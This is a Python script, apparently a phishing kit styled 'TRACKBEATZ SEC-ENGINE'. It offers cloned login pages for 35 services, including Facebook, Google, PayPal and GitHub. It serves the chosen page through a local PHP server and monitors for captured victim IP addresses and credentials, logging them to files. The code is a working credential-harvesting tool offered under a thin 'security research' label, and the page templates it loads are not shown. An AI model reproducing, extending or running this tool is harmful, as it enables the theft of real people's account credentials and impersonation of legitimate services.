import os
import subprocess
import time
import sys
import shutil

# --- CONFIGURATION ---
VERSION = "2.3.6-py-track"
HOST = "127.0.0.1"
PORT = 8080
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
WWW_DIR = os.path.join(BASE_DIR, ".server", "www")
AUTH_DIR = os.path.join(BASE_DIR, "auth")

# ANSI Colors
RED = "\033[31m"
GREEN = "\033[32m"
ORANGE = "\033[33m"
BLUE = "\033[34m"
CYAN = "\033[36m"
WHITE = "\033[37m"
RESET = "\033[0m"

def banner():
    print(f"""{CYAN}
  ████████╗██████╗  █████╗  ██████╗██╗  ██╗
  ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
     ██║   ██████╔╝███████║██║     █████╔╝ 
     ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ 
     ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗
     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
{ORANGE}            TRACKBEATZ SEC-ENGINE {RED}v{VERSION}
{GREEN}  [{WHITE}-{GREEN}]{CYAN} Python-Based Security Research Framework{WHITE}{RESET}""")
os.system("clear")
def setup_env():
    """Ensure directories exist and clean old sessions."""
    for folder in [WWW_DIR, AUTH_DIR]:
        if not os.path.exists(folder):
            os.makedirs(folder)
    
    # Kill existing processes
    processes = ["php", "cloudflared", "loclx"]
    for proc in processes:
        subprocess.run(["pkill", "-f", proc], stderr=subprocess.DEVNULL)

def check_dependencies():
    """Verify if required tools are installed."""
    tools = ["php", "curl"]
    missing = [t for t in tools if shutil.which(t) is None]
    if missing:
        print(f"{RED}[!] Missing tools: {', '.join(missing)}. Please install them.{RESET}")
        sys.exit(1)

def start_server(website):
    """Host the phishing site using PHP's built-in server."""
    site_path = os.path.join(BASE_DIR, ".sites", website)
    if not os.path.exists(site_path):
        print(f"{RED}[!] Site template '{website}' not found!{RESET}")
        return False

    # Copy files to working directory
    shutil.copytree(site_path, WWW_DIR, dirs_exist_ok=True)
    shutil.copy(os.path.join(BASE_DIR, ".sites", "ip.php"), WWW_DIR)

    print(f"{BLUE}[-] Starting PHP server on {HOST}:{PORT}...{RESET}")
    subprocess.Popen(
        ["php", "-S", f"{HOST}:{PORT}", "-t", WWW_DIR],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    return True

def monitor_data():
    """Real-time monitoring for captured IP and credentials."""
    ip_file = os.path.join(WWW_DIR, "ip.txt")
    creds_file = os.path.join(WWW_DIR, "usernames.txt")
    
    print(f"{ORANGE}[*] Waiting for victim interaction... (Ctrl+C to stop){RESET}")
    try:
        while True:
            if os.path.exists(ip_file):
                print(f"\n{GREEN}[!] Victim IP Found!{RESET}")
                with open(ip_file, "r") as f:
                    data = f.read()
                    print(f"{BLUE}{data}{RESET}")
                    with open(os.path.join(AUTH_DIR, "ip.txt"), "a") as log:
                        log.write(data)
                os.remove(ip_file)

            if os.path.exists(creds_file):
                print(f"\n{GREEN}[!!] Data Captured!{RESET}")
                with open(creds_file, "r") as f:
                    data = f.read()
                    print(f"{CYAN}{data}{RESET}")
                    with open(os.path.join(AUTH_DIR, "usernames.dat"), "a") as log:
                        log.write(data)
                os.remove(creds_file)
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}[-] Stopping Engine...{RESET}")
        setup_env() # Cleanup

def main_menu():
    setup_env()
    check_dependencies()
    banner()
    
    options = {
       "01": "facebook", "1": "facebook",
        "02": "instagram", "2": "instagram",
        "03": "google", "3": "google",
        "04": "microsoft", "4": "microsoft",
        "05": "netflix", "5": "netflix",
        "06": "paypal", "6": "paypal",
        "07": "steam", "7": "steam",
        "08": "twitter", "8": "twitter",
        "09": "playstation", "9": "playstation",
        "10": "tiktok", "11": "twitch", "12": "pinterest",
        "13": "snapchat", "14": "linkedin", "15": "ebay",
        "16": "quora", "17": "protonmail", "18": "spotify",
        "19": "reddit", "20": "adobe", "21": "deviantart",
        "22": "badoo", "23": "origin", "24": "dropbox",
        "25": "yahoo", "26": "wordpress", "27": "yandex",
        "28": "stackoverflow", "29": "vk", "30": "xbox",
        "31": "mediafire", "32": "gitlab", "33": "github",
        "34": "discord", "35": "roblox"
    }

    print(f"\n{RED}[::]{ORANGE} Select Target Platform {RED}[::]{RESET}\n")
    for i in range(1, 36):
        key = f"{i:02d}"
        name = options[key].capitalize()
        print(f"{RED}[{WHITE}{key}{RED}]{ORANGE} {name.ljust(15)}", end="\n" if i % 3 == 0 else "")

    choice = input(f"\n\n{RED}[-]{GREEN} Choice: {BLUE}").strip()
    
    if choice in options:
        if start_server(options[choice]):
            monitor_data()
    elif choice == "00":
        sys.exit()
    else:
        print(f"{RED}[!] Invalid Choice.{RESET}")

if __name__ == "__main__":
    main_menu() # This matches the function name defined on line 102
